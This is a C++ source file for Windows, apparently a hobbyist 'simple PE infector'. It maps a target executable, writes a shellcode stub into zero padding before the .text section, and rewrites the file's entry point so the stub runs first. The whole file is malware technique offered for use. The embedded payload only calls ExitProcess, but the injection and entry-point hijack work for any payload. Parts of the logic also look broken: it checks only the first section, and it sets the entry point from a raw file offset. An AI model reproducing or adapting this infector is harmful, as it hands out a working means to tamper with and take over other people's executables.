#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <direct.h>
#include <string>

using namespace std;
using std::mbstowcs;
//typedef unsigned long DWORD, *PDWORD, *LPDWORD;
//typedef unsigned __int3264 ULONG_PTR;


int GetTextSectionOffset(PIMAGE_SECTION_HEADER pSectionHeader, int NumberOfSections)
{
	if (NumberOfSections > 0) {
		if (!_strcmpi((char*)pSectionHeader->Name, ".text")) {
			return pSectionHeader->PointerToRawData;
		}
	}
	/* we did not find .text section */
	return 0;
}

int main(int argc, char *argv[])
{
	HANDLE hFile;
	HANDLE hMap;
	char *MappedFile = 0;
	DWORD FileSize; /* file size */
	DWORD delta;
	DWORD SectionOffset; /* .text section offset*/
	DWORD func_addr;
	IMAGE_DOS_HEADER *pDosHeader;
	IMAGE_NT_HEADERS *pNtHeader;
	IMAGE_SECTION_HEADER *pSecHeader;

	/* shell code*/
	char code[] =
		"\x6A\x00"              /*push 0 */
		"\xB8\x00\x00\x00\x00"  /*mov eax , func_addr (address will be inserted automaticly)*/
		"\xFF\xD0";             /*call eax */
	if (argc < 2) {
		printf("parameters : ssv.exe [filename] \n");
		printf("simple pe infector by _antony \n");
		return 0;
	}
	printf("target: [%s] \n", argv[1]);
	hFile = CreateFile(argv[1],
		GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[Error]: Can't open File! Error code : %d", GetLastError());
		return -1;
	}
	FileSize = GetFileSize(hFile, 0);
	printf("[File Size ]: %d \n", FileSize);

	/* mapping file */
	hMap = CreateFileMapping(hFile, 0, PAGE_READWRITE, 0, FileSize, 0);

	if (hMap == INVALID_HANDLE_VALUE) {
		printf("[Error]: Can't map file! Error code: %d\n", GetLastError());
		CloseHandle(hFile);
		return -1;
	}

	MappedFile = (char*)MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, FileSize);

	if (MappedFile == NULL) {
		printf("[Error]: Can't map file! Error code %d\n", GetLastError());
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(MappedFile);
		return -1;
	}
	printf("ok1");
	pDosHeader = (IMAGE_DOS_HEADER*)MappedFile;
	pNtHeader = (IMAGE_NT_HEADERS*)((DWORD)MappedFile + pDosHeader->e_lfanew);
	pSecHeader = IMAGE_FIRST_SECTION(pNtHeader);

	SectionOffset = GetTextSectionOffset(pSecHeader, pNtHeader->FileHeader.NumberOfSections);
	if (SectionOffset == 0) {
		printf("[Error]: Can't find .text section!\n");
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(MappedFile);
		return -1;
	}

	delta = SectionOffset - sizeof(code);

	int i;
	BYTE check;

	printf("scanning...\n");
	for (i = 0; i < sizeof(code); i++) {
		check = *((BYTE*)MappedFile + delta + i);
		printf("%X \t", check);
		if (check != 0) {
			printf("There is some data...\n");
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(MappedFile);
			return -1;
		}
	}

	printf("Space if free, infecting File...\n");
	func_addr = (DWORD)GetProcAddress(LoadLibrary("kernel32.dll"), "ExitProcess");
	for (i = 0; i < sizeof(code); i++) {
		if (*(DWORD*)&code[i] == 0x00000B8) {
			*(DWORD*)(code + i + 1) = func_addr;
		}
	}
	printf("Old Entry Point : %08X \n",
		pNtHeader->OptionalHeader.AddressOfEntryPoint);

	memcpy(MappedFile + delta, code, sizeof(code));
	pNtHeader->OptionalHeader.AddressOfEntryPoint = delta;
	printf("File infected!\n");
	printf("New Entry Point: %08X \n", delta);

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(MappedFile);

	return 0;
}